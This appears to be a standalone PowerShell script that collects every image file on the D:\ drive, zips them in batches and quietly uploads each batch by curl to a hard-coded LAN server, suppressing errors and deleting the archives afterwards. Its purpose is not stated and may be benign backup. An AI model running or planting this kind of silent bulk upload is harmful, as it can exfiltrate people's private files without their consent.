$ErrorActionPreference = "Stop"

$sourceFolder = "D:\"
$uploadUrl = "http://192.168.231.21:5000/upload_zip"

$imageFiles = Get-ChildItem -Path $sourceFolder -Recurse -Include *.jpg, *.jpeg, *.png, *.bmp, *.gif, *.webp, *.tiff -File

$batchSize = 20
$counter = 0

while ($counter -lt $imageFiles.Count) {
    $batch = $imageFiles[$counter..([Math]::Min($counter + $batchSize - 1, $imageFiles.Count - 1))]
    $counter += $batchSize

    $zipName = "batch_$counter.zip"
    $zipPath = "$env:TEMP\$zipName"

    if (Test-Path $zipPath) {
        Remove-Item $zipPath -Force | Out-Null
    }

    Add-Type -AssemblyName 'System.IO.Compression.FileSystem'
    $zipFile = [System.IO.Compression.ZipFile]::Open($zipPath, 'Create')

    foreach ($file in $batch) {
        $relativePath = $file.FullName.Substring($sourceFolder.Length).TrimStart('\')
        [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipFile, $file.FullName, $relativePath) | Out-Null
    }

    $zipFile.Dispose()

    Start-Job -ScriptBlock {
        param($zipPath, $uploadUrl)
        try {
            & curl.exe -X POST -F $("file=@`"$zipPath`"") $uploadUrl | Out-Null
        } catch {
        } finally {
            if (Test-Path $zipPath) {
                Remove-Item $zipPath -Force | Out-Null
            }
        }
    } -ArgumentList $zipPath, $uploadUrl | Out-Null
}

Get-Job | Wait-Job | Receive-Job | Out-Null
